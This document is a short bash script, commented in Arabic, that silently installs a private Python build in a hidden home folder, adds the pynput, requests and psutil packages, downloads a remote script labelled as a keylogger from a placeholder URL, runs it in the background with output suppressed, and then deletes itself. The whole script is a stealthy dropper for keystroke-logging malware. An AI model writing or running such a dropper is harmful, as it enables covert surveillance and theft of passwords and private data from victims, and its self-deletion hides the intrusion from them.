#!/bin/bash

# إعداد المسارات
INSTALL_DIR="$HOME/.pyenv_red"
PYTHON_VERSION="3.11.2"
PYTHON_URL="https://www.python.org/ftp/python/$PYTHON_VERSION/Python-$PYTHON_VERSION.tgz"
KL_SCRIPT_URL="https://example.com/keylogger.py"  # <- عدل هذا

# أنشئ مجلد التثبيت
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

echo "[*] تحميل Python $PYTHON_VERSION ..."
wget -q "$PYTHON_URL" -O python.tgz || curl -sL "$PYTHON_URL" -o python.tgz

echo "[*] فك الضغط ..."
tar -xf python.tgz
cd Python-$PYTHON_VERSION

echo "[*] إعداد Python في مجلد المستخدم ..."
./configure --prefix="$INSTALL_DIR/python" > /dev/null
make -s && make install > /dev/null

export PATH="$INSTALL_DIR/python/bin:$PATH"

# تحقق من التثبيت
if ! command -v python3 &> /dev/null; then
    echo "[!] فشل تثبيت Python!"
    exit 1
fi

echo "[*] تحميل pip وتثبيت الحزم ..."
wget -q https://bootstrap.pypa.io/get-pip.py -O get-pip.py
./python get-pip.py > /dev/null

./python -m pip install requests pynput psutil --quiet --disable-pip-version-check --no-input

echo "[*] تحميل السكريبت الرئيسي ..."
wget -q "$KL_SCRIPT_URL" -O main.py

echo "[*] تشغيل السكريبت بصمت ..."
nohup ./python main.py > /dev/null 2>&1 &

# حذف السكريبت نفسه (اختياري)
rm -- "$0"
